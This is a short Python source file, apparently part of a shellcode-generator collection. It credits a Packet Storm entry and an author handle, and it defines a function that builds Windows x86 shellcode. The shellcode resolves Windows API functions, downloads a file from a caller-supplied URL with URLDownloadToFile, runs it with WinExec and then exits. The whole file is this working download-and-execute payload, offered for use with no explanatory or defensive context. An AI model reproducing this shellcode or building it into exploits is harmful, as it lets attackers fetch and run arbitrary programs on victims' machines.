#https://packetstormsecurity.com/files/119812/Allwin-URLDownloadToFile-WinExec-ExitProcess-Shellcode.html
#Author: RubberDuck


#WORK
def downANDexecute( URL,FILENAME):
    shellcode =  r"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B"
    shellcode += r"\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53"
    shellcode += r"\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72"
    shellcode += r"\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81"
    shellcode += r"\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04"
    shellcode += r"\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64"
    shellcode += r"\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3"
    shellcode += r"\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3"
    shellcode += r"\x8B\x14\x8E\x03\xD3\x33\xC9\x51"
    shellcode += FILENAME
    shellcode += r"\x53\x52"
    shellcode += r"\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62"
    shellcode += r"\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2"
    shellcode += r"\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C"
    shellcode += r"\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C"
    shellcode += r"\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
    shellcode += r"\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33"
    shellcode += r"\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64"
    shellcode += r"\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C"
    shellcode += r"\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24"
    shellcode += r"\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83"
    shellcode += r"\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68"
    shellcode += r"\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57"
    shellcode += r"\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D"
    shellcode += r"\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A"
    shellcode += r"\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03"
    shellcode += r"\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69"
    shellcode += r"\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF"
    shellcode += r"\xFF\xFF"
    shellcode += URL
    return shellcode


